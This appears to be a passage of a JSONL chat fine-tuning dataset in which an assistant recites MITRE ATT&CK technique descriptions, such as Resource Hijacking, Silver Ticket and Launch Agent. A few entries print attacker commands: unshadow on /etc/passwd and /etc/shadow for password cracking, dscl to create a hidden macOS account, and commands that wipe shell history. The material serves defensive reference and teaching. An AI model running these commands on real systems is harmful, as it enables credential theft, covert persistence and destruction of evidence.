human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Resource Hijacking' and with the Id: T1496 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Resource Hijacking' and with the Id: T1496 is described as follows: Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Establish Accounts' and with the Id: T1585 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Establish Accounts' and with the Id: T1585 is described as follows: Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Obtain Capabilities' and with the Id: T1588 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Obtain Capabilities' and with the Id: T1588 is described as follows: Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Screensaver' and with the Id: T1546.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Screensaver' and with the Id: T1546.002 is described as follows: Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:* <code>SCRNSAVE.exe</code> - set to malicious PE path* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Users' and with the Id: T1147 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Users' and with the Id: T1147 is described as follows: Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Conditional Access Policies' and with the Id: T1556.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Conditional Access Policies' and with the Id: T1556.009 is described as follows: Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.For example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.. The systems targeted by this attack pattern are: Azure AD, SaaS, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create Cloud Instance' and with the Id: T1578.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create Cloud Instance' and with the Id: T1578.002 is described as follows: An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compile After Delivery' and with the Id: T1500 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compile After Delivery' and with the Id: T1500 is described as follows: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Secrets Management Stores' and with the Id: T1555.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Secrets Management Stores' and with the Id: T1555.006 is described as follows: Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  If an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Repositories' and with the Id: T1213.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Repositories' and with the Id: T1213.003 is described as follows: Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.. The systems targeted by this attack pattern are: SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transmitted Data Manipulation' and with the Id: T1565.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transmitted Data Manipulation' and with the Id: T1565.002 is described as follows: Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: '/etc/passwd and /etc/shadow' and with the Id: T1003.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: '/etc/passwd and /etc/shadow' and with the Id: T1003.008 is described as follows: Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>. The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launch Agent' and with the Id: T1543.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launch Agent' and with the Id: T1543.001 is described as follows: Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks. Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command. Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) . The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Services' and with the Id: T1569 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Services' and with the Id: T1569 is described as follows: Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Command Shell' and with the Id: T1059.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Command Shell' and with the Id: T1059.003 is described as follows: Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Proc Memory' and with the Id: T1055.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Proc Memory' and with the Id: T1055.009 is described as follows: Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compiled HTML File' and with the Id: T1223 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compiled HTML File' and with the Id: T1223 is described as follows: Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Acquire Access' and with the Id: T1650 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Acquire Access' and with the Id: T1650 is described as follows: Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a \u201cload\u201d that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Patch System Image' and with the Id: T1601.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Patch System Image' and with the Id: T1601.001 is described as follows: Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. . The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Silver Ticket' and with the Id: T1558.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Silver Ticket' and with the Id: T1558.002 is described as follows: Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Information Repositories' and with the Id: T1213 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Information Repositories' and with the Id: T1213 is described as follows: Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resourcesInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.. The systems targeted by this attack pattern are: Linux, Windows, macOS, SaaS, Office 365, Google Workspace, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Persistence' and with the Id: T1070.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Persistence' and with the Id: T1070.009 is described as follows: Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)In some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Command History' and with the Id: T1146 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Command History' and with the Id: T1146 is described as follows: In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Credential Manager' and with the Id: T1555.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Credential Manager' and with the Id: T1555.004 is described as follows: Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading 